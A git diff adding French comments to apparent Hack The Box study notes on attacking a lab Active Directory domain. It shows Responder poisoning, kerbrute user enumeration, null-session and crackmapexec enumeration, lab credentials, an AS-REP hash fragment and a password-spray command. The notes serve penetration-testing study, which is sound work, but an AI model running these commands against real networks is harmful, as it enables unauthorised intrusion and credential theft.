@@ -147,14 +147,17 @@ Group3r is useful for auditing and finding security misconfigurations in AD Grou
 [ADRecon 	](https://github.com/adrecon/ADRecon)
 A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.
 
+Cette commande capture et affiche les paquets réseau sur l’interface ens224
 ```
 keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
 ```
 
+Lance l’outil Responder sur l’interface ens224 en mode analyse.
 ```
 sudo responder -I ens224 -A
 ```
 
+ Envoie des paquets ICMP à tous les hôtes dans le sous-réseau 172.16.5.0/23 pour déterminer lesquels sont actifs.
 ```
 keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23
 
@@ -184,6 +187,8 @@ keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23
        15.366 sec (elapsed real time)
 ```
 
+Déplace l’exécutable kerbrute vers le répertoire /usr/local/bin pour le rendre accessible globalement.
+Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT.LOCAL en utilisant le contrôleur de domaine 172.16.5.5 et enregistre les utilisateurs valides dans le fichier valid_ad_users.
 ```
 sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
@@ -323,18 +328,44 @@ sudo responder -I ens224
 
 ```
 
+ Utilise enum4linux pour énumérer les utilisateurs sur l’hôte 172.16.5.5 et filtre les résultats pour afficher uniquement les noms d’utilisateur.
 ```
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+```
+
+Utilise rpcclient pour se connecter à l’hôte 172.16.5.5 sans authentification.
+```
 rpcclient -U "" -N 172.16.5.5
+
+```
+
+ Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5.
+```
 crackmapexec smb 172.16.5.5 --users
+```
+
+Utilise windapsearch pour interroger le contrôleur de domaine à l’adresse IP 172.16.5.5 sans authentification et énumérer les utilisateurs.
+```
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+
+Utilise kerbrute pour énumérer les utilisateurs dans le domaine inlanefreight.local en utilisant le contrôleur de domaine 172.16.5.5 et le fichier de noms d’utilisateur jsmith.txt
+```
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+
+Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5 avec les identifiants htb-student et Academy_student_AD!
+```
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
+ Utilise ldapsearch pour interroger le serveur LDAP à 172.16.5.5 et filtre les résultats pour afficher les noms de compte SAM.
 ```
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 ```
+
+Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT en utilisant le contrôleur de domaine INLANEFREIGHT.LOCAL et le fichier de noms d’utilisateur jsmith.txt.
 ```
 kerbrute userenum -d INLANEFREIGHT --dc INLANEFREIGHT.LOCAL jsmith.txt                                                         
 
@@ -409,6 +440,8 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf
 2025/01/23 09:21:02 >  [+] VALID USERNAME:  wshepherd@INLANEFREIGHT
 2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
 ```
+
+Cette commande utilise un script PowerShell pour effectuer une attaque de pulvérisation de mots de passe sur un domaine Active Directory.
 ```
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
@@ -453,10 +486,10 @@ RealTimeScanDirection           : 0
 PSComputerName                  :
 ```
 
-```
-Using Get-AppLockerPolicy cmdlet
-Enumerating Security Controls
+Cette commande PowerShell récupère la politique AppLocker effective et affiche les collections de règles.
+Utile pour vérifier les règles AppLocker en vigueur sur un système, ce qui peut aider à comprendre quelles applications sont autorisées ou bloquées.
 
+```
 PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
@@ -501,8 +534,8 @@ Action              : Allow
 
 ```
 
-Enumerating Language Mode
-Enumerating Security Controls
+Cette commande PowerShell affiche le mode de langage actuel de la session.
+Utile pour vérifier si la session PowerShell est en mode restreint ou complet, ce qui peut affecter l’exécution des scripts.
 ```
 PS C:\htb> $ExecutionContext.SessionState.LanguageMode
 
@@ -510,9 +543,6 @@ ConstrainedLanguage
 ```
 
 ```
-Using Find-LAPSDelegatedGroups
-Enumerating Security Controls
-
 PS C:\htb> Find-LAPSDelegatedGroups
 
 OrgUnit                                             Delegated Groups
